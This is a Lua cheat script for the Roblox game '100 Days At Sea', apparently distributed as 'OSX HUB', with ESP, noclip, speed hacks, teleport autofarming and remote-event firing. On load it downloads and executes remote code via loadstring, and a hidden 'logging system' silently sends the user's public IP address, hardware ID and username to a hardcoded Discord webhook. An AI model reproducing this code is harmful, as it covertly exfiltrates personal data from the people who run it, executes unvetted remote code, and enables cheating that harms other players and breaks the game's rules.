local OSX = loadstring(game:HttpGet("https://raw.githubusercontent.com/yxucnx/OSX-HUB-Lib/refs/heads/main/OSX_Lib.lua?v=" .. tick()))()

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- Fetch Game Name
local success, productInfo = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)
local GameName = success and productInfo and productInfo.Name or "100 Days At Sea"

-- [[ LOGGING SYSTEM ]] --
local WebhookURL = "https://discord.com/api/webhooks/1490398138220019825/jlZBTnlWn2ZWKEd4bvBUYjQrnQXCX4N9MjfVSK0ceBqQQVIBHaZQ4xDcPnCnA0SlDbAs"

local function SendLog()
    task.spawn(function()
        local successIP, ip = pcall(function() return game:HttpGet("https://api4.ipify.org/") end)
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        local time = os.date("%X")
        
        local payload = {
            ["username"] = "𝗢𝗦𝗫 𝗛𝗨𝗕 - 𝗟𝗢𝗚 𝗨𝗦𝗘 𝗦𝗖𝗥𝗜𝗣𝗧",
            ["avatar_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless",
            ["embeds"] = {{
                ["title"] = "[!] : 𝗧𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘁𝗵𝗲 𝘂𝘀𝗲 𝗼𝗳 𝗮 𝘀𝗰𝗿𝗶𝗽𝘁.",
                ["description"] = string.format(
                    "――――――――――――――――――――――\n\n**👤 User :**  ```%s```\n**🎮 Script Name :** ```%s```\n**🖥️ HWID :** ```%s```\n**🔐 KEY :** ```%s```\n**🗺️ IP :** ```%s```\n**❌ ACC BAN :** ```%s```\n**🧾Reason :** ```%s```\n** ⏳ Time Data :** ```%s```\n\n――――――――――――――――――――――",
                    LocalPlayer.Name, GameName, hwid, "None", (successIP and ip or "Unknown"), "None", "None", time
                ),
                ["color"] = 34303,
                ["footer"] = {
                    ["text"] = "© 2026 Osx Hub. All rights reserved.",
                    ["icon_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless"
                },
                ["image"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1485621966575501312/1490364198008393818/standard_1.gif?ex=69d3c952&is=69d277d2&hm=84671fab55d2308ed14c9bd662582a0e6170d1ed0a55c8c6fcbe0cdbbea901fd&="
                }
            }}
        }
        
        pcall(function()
            (request or http_request or (http and http.request))({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

-- Call Initial Log
SendLog()

print("OSX HUB: 100 Days At Sea Script Loading...")

-- [[ LIGHTING ORIGINALS ]] --
local originalBrightness = Lighting.Brightness
local originalOutdoorAmbient = Lighting.OutdoorAmbient
local originalAmbient = Lighting.Ambient
local originalGlobalShadows = Lighting.GlobalShadows

-- [[ CONFIGURATION ]] --
local Config = {
    InfiniteJump = false,
    PlayerESP = false,
    ItemESP = false,
    WalkSpeed = 16,
    CFrameSpeed = false,
    CFrameValue = 1,
    NoClip = false,
    AutoFarmCoin = false,
    AutoGrinder = false,
    BagCapacity = 5,
    TPDelay = 5,
    TPHeight = 3,
    FarmingItems = {"Wood", "Scrap", "Metal", "Plastic"},
    RemoteEventID = 488111,
    AutoTP = false,
    FullBright = false
}

local lootKeywords = {"wood", "plastic", "scrap", "metal", "barrel", "crate", "box", "plank", "bolt", "leaf", "lightning rod", "autoturret", "cannon", "kraken arm", "shelter", "radar", "factory", "magnet", "sawmill", "cooking pot", "pump jack", "oil drill", "trap", "raft", "jetski", "dinghy", "yacht", "galleon", "sundial", "radio", "outpost", "bell", "pizza oven"}

-- [[ WINDOW SETUP ]] --
local Window = OSX:CreateWindow({
    Title = "OSX HUB | 100 DAYS AT SEA",
    Subtitle = "Made by: LilYouDev1997 | Discord: discord.gg/osxhub",
    WindowLogo = "https://img2.pic.in.th/logo512v2.png",
    FloatingLogo = "https://img1.pic.in.th/images/logo512v1.png",
    ToggleKey = Enum.KeyCode.RightControl
})

local Tabs = {
    Main = Window:AddTab({ Title = "Player", SubDescription = "Movement & Settings", Icon = "user" }),
    AutoFarm = Window:AddTab({ Title = "Auto Farm", SubDescription = "Farming Automation", Icon = "sword" }),
    Visuals = Window:AddTab({ Title = "Visuals", SubDescription = "ESP & Lighting", Icon = "eye" }),
    Settings = Window:AddTab({ Title = "Configs", SubDescription = "Remotes & Menu", Icon = "settings" })
}

-- [[ HELPER FUNCTIONS ]] --

local function CreateItemESP(instance)
    if not (instance:IsA("BasePart") or instance:IsA("Model")) then return end
    if instance:FindFirstChild("SherlockLabel") then return end
    
    local nameLower = instance.Name:lower()
    local isLoot = false
    for _, key in ipairs(lootKeywords) do
        if nameLower:find(key) then
            isLoot = true
            break
        end
    end
    
    if isLoot then
        local bg = Instance.new("BillboardGui")
        bg.Name = "SherlockLabel"
        bg.Size = UDim2.new(0, 120, 0, 50)
        bg.AlwaysOnTop = true
        bg.Adornee = instance
        bg.Parent = instance

        local tl = Instance.new("TextLabel")
        tl.Parent = bg
        tl.Size = UDim2.new(1, 0, 1, 0)
        tl.BackgroundTransparency = 1
        tl.TextColor3 = Color3.new(0, 1, 1)
        tl.Text = "[ " .. instance.Name .. " ]"
        tl.Font = Enum.Font.GothamBold
        tl.TextSize = 11
        tl.TextStrokeTransparency = 0.5
    end
end

local function ClearItemESP()
    for _, v in ipairs(workspace:GetDescendants()) do
        if v.Name == "SherlockLabel" then
            v:Destroy()
        end
    end
end

local function CreatePlayerESP(player)
    if player == LocalPlayer then return end
    
    local function onCharacterAdded(char)
        task.wait(0.5)
        local hrp = char:WaitForChild("HumanoidRootPart", 5)
        if hrp and not hrp:FindFirstChild("PlayerLabel") then
            local highlight = char:FindFirstChild("PlayerHighlight") or Instance.new("Highlight")
            highlight.Name = "PlayerHighlight"
            highlight.FillColor = Color3.new(0.5, 0, 1)
            highlight.OutlineColor = Color3.new(1, 1, 1)
            highlight.Parent = char

            local bg = Instance.new("BillboardGui")
            bg.Name = "PlayerLabel"
            bg.Size = UDim2.new(0, 150, 0, 50)
            bg.AlwaysOnTop = true
            bg.ExtentsOffset = Vector3.new(0, 3, 0)
            bg.Adornee = hrp
            bg.Parent = hrp

            local tl = Instance.new("TextLabel")
            tl.Parent = bg
            tl.Size = UDim2.new(1, 0, 1, 0)
            tl.BackgroundTransparency = 1
            tl.TextColor3 = Color3.new(1, 1, 1)
            tl.Font = Enum.Font.GothamBold
            tl.TextSize = 12
            tl.TextStrokeTransparency = 0

            task.spawn(function()
                while char.Parent and hrp.Parent and Config.PlayerESP do
                    local dist = math.floor((LocalPlayer.Character.HumanoidRootPart.Position - hrp.Position).Magnitude)
                    tl.Text = player.Name .. " [" .. dist .. "m]"
                    task.wait(0.1)
                end
                if bg then bg:Destroy() end
                if highlight then highlight:Destroy() end
            end)
        end
    end

    if player.Character then
        onCharacterAdded(player.Character)
    end
    player.CharacterAdded:Connect(onCharacterAdded)
end

local function ClearPlayerESP()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Character then
            local hl = p.Character:FindFirstChild("PlayerHighlight")
            if hl then hl:Destroy() end
            local hrp = p.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local lbl = hrp:FindFirstChild("PlayerLabel")
                if lbl then lbl:Destroy() end
            end
        end
    end
end

-- [[ PLAYER TAB ]] --
local MovementPanel = Tabs.Main:AddPanel("Movement Controls")

MovementPanel:AddToggle({
    Title = "Infinite Jump",
    Description = "กระโดดได้ไม่จำกัดครั้ง",
    Default = false,
    Callback = function(Value)
        Config.InfiniteJump = Value
    end
})

MovementPanel:AddSlider({
    Title = "WalkSpeed",
    Description = "ปรับความเร็วการเดิน",
    Default = 16, Min = 16, Max = 200, Rounding = 0,
    Callback = function(Value) Config.WalkSpeed = Value end
})

MovementPanel:AddToggle({
    Title = "CFrame Speed",
    Description = "เพิ่มความเร็วโดยใช้ CFrame (แรงกว่าปกติ)",
    Default = false,
    Callback = function(Value) Config.CFrameSpeed = Value end
})

MovementPanel:AddSlider({
    Title = "CFrame Speed Value",
    Description = "ระดับความเร็ว CFrame",
    Default = 1, Min = 1, Max = 10, Rounding = 1,
    Callback = function(Value) Config.CFrameValue = Value end
})

MovementPanel:AddToggle({
    Title = "No Clip",
    Description = "เดินทะลุกำแพง",
    Default = false,
    Callback = function(Value) Config.NoClip = Value end
})

-- [[ AUTO FARM TAB ]] --
local MainFarmPanel = Tabs.AutoFarm:AddPanel("Main Farming")

MainFarmPanel:AddToggle({
    Title = "Auto TP Farm",
    Description = "วาร์ปไปเก็บของในทะเลอัตโนมัติ",
    Default = false,
    Callback = function(Value)
        Config.AutoTP = Value
    end
})

MainFarmPanel:AddSlider({
    Title = "TP Delay (Seconds)",
    Description = "เวลารอที่ไอเทมเพื่อให้เรากดเก็บเอง (วิ)",
    Default = 5, Min = 1, Max = 15, Rounding = 1,
    Callback = function(Value) Config.TPDelay = Value end
})

MainFarmPanel:AddSlider({
    Title = "TP Height Offset",
    Description = "ระยะความสูงจากไอเทม (ป้องกันตัวละครล้ม)",
    Default = 3, Min = -5, Max = 10, Rounding = 1,
    Callback = function(Value) Config.TPHeight = Value end
})

local ItemSelectPanel = Tabs.AutoFarm:AddPanel("Select Items to Farm")

local farmingItemsList = {"Wood", "Scrap", "Metal", "Plastic", "Bolt", "Plank", "Goo", "Cloth", "Barrel", "Crate"}
for _, itemName in ipairs(farmingItemsList) do
    ItemSelectPanel:AddToggle({
        Title = itemName,
        Default = table.find(Config.FarmingItems, itemName) ~= nil,
        Callback = function(Value)
            if Value then
                if not table.find(Config.FarmingItems, itemName) then
                    table.insert(Config.FarmingItems, itemName)
                end
            else
                local index = table.find(Config.FarmingItems, itemName)
                if index then
                    table.remove(Config.FarmingItems, index)
                end
            end
        end
    })
end

local GrinderPanel = Tabs.AutoFarm:AddPanel("Grinder & Bag")

GrinderPanel:AddToggle({
    Title = "Auto Grinder Deposit",
    Description = "วาร์ปไปเทของที่เครื่องบดอัตโนมัติเมื่อเก็บของครบ",
    Default = false,
    Callback = function(Value)
        Config.AutoGrinder = Value
    end
})

GrinderPanel:AddSlider({
    Title = "Bag Capacity",
    Description = "ระบุจำนวนที่เป้รับได้ (5/10/15)",
    Default = 5, Min = 1, Max = 15, Rounding = 0,
    Callback = function(Value) Config.BagCapacity = Value end
})

local ChestPanel = Tabs.AutoFarm:AddPanel("Special Farming")

ChestPanel:AddToggle({
    Title = "Auto Farm Coin",
    Description = "วาร์ปไปเปิดกล่องเพื่อฟาร์มเงิน (เก็บเงินอัตโนมัติ)",
    Default = false,
    Callback = function(Value)
        Config.AutoFarmCoin = Value
    end
})



-- [[ VISUALS TAB ]] --
local ESPPanel = Tabs.Visuals:AddPanel("ESP Features")

ESPPanel:AddToggle({
    Title = "Player ESP",
    Description = "แสดงชื่อและระยะทางของผู้เล่นคนอื่น",
    Default = false,
    Callback = function(Value)
        Config.PlayerESP = Value
        if Value then
            for _, player in ipairs(Players:GetPlayers()) do
                CreatePlayerESP(player)
            end
        else
            ClearPlayerESP()
        end
    end
})

ESPPanel:AddToggle({
    Title = "Item ESP",
    Description = "แสดงตำแหน่งของไอเทมต่างๆ",
    Default = false,
    Callback = function(Value)
        Config.ItemESP = Value
        if not Value then
            ClearItemESP()
        end
    end
})

local WorldPanel = Tabs.Visuals:AddPanel("World Environments")

WorldPanel:AddToggle({
    Title = "Full Bright",
    Description = "เพิ่มความสว่างสูงสุด",
    Default = false,
    Callback = function(Value)
        Config.FullBright = Value
        if Value then
            Lighting.Brightness = 2
            Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
            Lighting.Ambient = Color3.fromRGB(255, 255, 255)
            Lighting.GlobalShadows = false
        else
            Lighting.Brightness = originalBrightness
            Lighting.OutdoorAmbient = originalOutdoorAmbient
            Lighting.Ambient = originalAmbient
            Lighting.GlobalShadows = originalGlobalShadows
        end
    end
})

-- [[ LOGIC LOOPS ]] --

-- Item ESP Loop
task.spawn(function()
    while true do
        if Config.ItemESP then
            for _, v in ipairs(workspace:GetDescendants()) do
                if not Config.ItemESP then break end
                CreateItemESP(v)
            end
        end
        task.wait(2)
    end
end)

-- Infinite Jump Listener
UserInputService.JumpRequest:Connect(function()
    if Config.InfiniteJump and LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

-- Handle New Players for ESP
Players.PlayerAdded:Connect(function(player)
    if Config.PlayerESP then
        CreatePlayerESP(player)
    end
end)

-- WalkSpeed Loop
task.spawn(function()
    while true do
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            if Config.WalkSpeed ~= 16 then
                hum.WalkSpeed = Config.WalkSpeed
            end
        end
        task.wait(0.1)
    end
end)

-- CFrame Speed Connection
RunService.RenderStepped:Connect(function()
    if Config.CFrameSpeed then
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hrp and hum and hum.MoveDirection.Magnitude > 0 then
            hrp.CFrame = hrp.CFrame + hum.MoveDirection * (Config.CFrameValue * 0.1)
        end
    end
end)

-- NoClip Connection
RunService.Stepped:Connect(function()
    if Config.NoClip and LocalPlayer.Character then
        for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide then
                part.CanCollide = false
            end
        end
    end
end)

-- Auto Farm Coin Loop
task.spawn(function()
    while true do
        if Config.AutoFarmCoin then
            local chests = workspace:FindFirstChild("Chests")
            if chests then
                for _, prompt in ipairs(chests:GetDescendants()) do
                    if not Config.AutoFarmCoin then break end
                    if prompt:IsA("ProximityPrompt") then
                        local parent = prompt.Parent
                        if parent and parent:IsA("BasePart") then
                            local char = LocalPlayer.Character
                            local root = char and char:FindFirstChild("HumanoidRootPart")
                            if root then
                                -- Teleport slightly above the chest
                                root.CFrame = CFrame.new(parent.Position + Vector3.new(0, 3, 0))
                                task.wait(0.2)
                                fireproximityprompt(prompt)
                                task.wait(0.8) -- Wait for chest to open/coin to be given
                            end
                        end
                    end
                end
            end
        end
        task.wait(1)
    end
end)



-- [[ FINAL SETUP ]] --

-- Auto TP Farm Loop with Selection and Manual Delay
task.spawn(function()
    local gatherCount = 0
    while true do
        if Config.AutoTP then
            local debris = workspace:FindFirstChild("DebrisField")
            if debris then
                for _, folder in ipairs(debris:GetChildren()) do
                    if not Config.AutoTP then break end
                    for _, item in ipairs(folder:GetChildren()) do
                        if not Config.AutoTP then break end
                        
                        -- Check if item is selected in dropdown
                        local shouldFarm = false
                        local nameLower = item.Name:lower()
                        for _, selected in ipairs(Config.FarmingItems) do
                            if type(selected) == "string" and nameLower:find(selected:lower()) then
                                shouldFarm = true
                                break
                            end
                        end
                        
                        if shouldFarm then
                            -- Get item position
                            local targetCFrame = nil
                            if item:IsA("BasePart") then
                                targetCFrame = item.CFrame
                            elseif item:IsA("Model") then
                                targetCFrame = item:GetPivot()
                            end
                            
                            if targetCFrame then
                                local char = LocalPlayer.Character
                                local root = char and char:FindFirstChild("HumanoidRootPart")
                                if root then
                                    -- Teleport with height offset
                                    root.CFrame = targetCFrame * CFrame.new(0, Config.TPHeight, 0)
                                    OSX:Notify({ Title = "Manual Collect", Content = "วาร์ปถึง " .. item.Name .. " แล้ว! กรุณากดเก็บเองภายใน " .. Config.TPDelay .. " วิ", Duration = 3 })
                                    
                                    -- Optional: Auto-fire prompt anyway to help
                                    for _, obj in ipairs(item:GetDescendants()) do
                                        if obj:IsA("ProximityPrompt") then
                                            fireproximityprompt(obj)
                                        end
                                    end
                                    
                                    task.wait(Config.TPDelay) -- Wait for manual collection
                                    gatherCount = gatherCount + 1
                                    
                                    -- Auto Grinder Logic
                                    if Config.AutoGrinder and gatherCount >= Config.BagCapacity then
                                        local grinder = workspace:FindFirstChild("Grinder", true)
                                        local collection = grinder and grinder:FindFirstChild("Collection")
                                        if collection then
                                            OSX:Notify({ Title = "Auto Grinder", Content = "ถุงเต็มแล้ว กำลังวาร์ปไปเทของ...", Duration = 3 })
                                            root.CFrame = collection.CFrame + Vector3.new(0, 5, 0)
                                            task.wait(5) -- Wait 5 seconds for player to drop items
                                            
                                            -- Extra: Try to auto-drop if RemoteID is set
                                            local remote = game:GetService("LogService"):FindFirstChild("RemoteEvent")
                                            if remote and Config.RemoteEventID > 0 then
                                                for i = 1, Config.BagCapacity + 2 do
                                                    remote:FireServer(Config.RemoteEventID, "DropItem")
                                                    task.wait(0.1)
                                                end
                                            end
                                        end
                                        gatherCount = 0
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        task.wait(1)
    end
end)

-- [[ CONFIGS TAB ]] --
local RemotePanel = Tabs.Settings:AddPanel("Remote Configuration")

RemotePanel:AddSlider({
    Title = "RemoteEvent ID",
    Description = "เลข ID ล่าสุดจาก Remote Spy",
    Default = 488111, Min = 0, Max = 9999999, Rounding = 0,
    Callback = function(Value) Config.RemoteEventID = Value end
})

local MenuSettingsPanel = Tabs.Settings:AddPanel("Menu Settings")

MenuSettingsPanel:AddWideButton({
    Title = "Unload Script",
    Callback = function()
        Window:Destroy()
    end
})

print("OSX HUB | 100 Days At Sea Script Loaded Successfully")

